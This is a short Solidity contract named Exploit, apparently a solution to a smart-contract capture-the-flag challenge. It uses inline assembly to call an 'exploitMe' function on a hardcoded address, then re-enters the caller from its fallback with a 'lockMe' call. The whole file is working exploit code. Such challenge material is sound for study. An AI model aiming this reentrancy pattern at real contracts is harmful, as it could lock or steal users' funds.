pragma solidity ^0.8.13;

import { Challenge } from "./Challenge.sol";

contract Exploit {
    bytes4 constant EXPLOIT_ME_SIG = 0x548853a0;
    bytes4 constant LOCK_ME_SIG = 0x4c228cc7;

    function callExploitMe() external {
        assembly {
            // 0xdead only used for local test
            if iszero(eq(0x000000000000000000000000000000000000dEaD, caller())) {
                revert(0, 0)
            }

            let ptr := mload(0x40)

            mstore(ptr, EXPLOIT_ME_SIG)
            mstore(add(ptr, 0x04), 0x000000000000000000000000000000000000dEaD)

            let result := call(
                gas(),
                0xcD7AB80Da7C893f86fA8deDDf862b74D94f4478E,
                0,
                ptr,
                0x24,
                0,
                0
            )

            if eq(result, 0) {
                revert(0, 0)
            }
        }
    }

    fallback() external {
        assembly {
            mstore(0x0, LOCK_ME_SIG)

            let result := call(
                gas(),
                caller(),
                0,
                0x0,
                0x04,
                0,
                0
            )

            if eq(result, 0) {
                revert(0, 0)
            }
        }
    }
}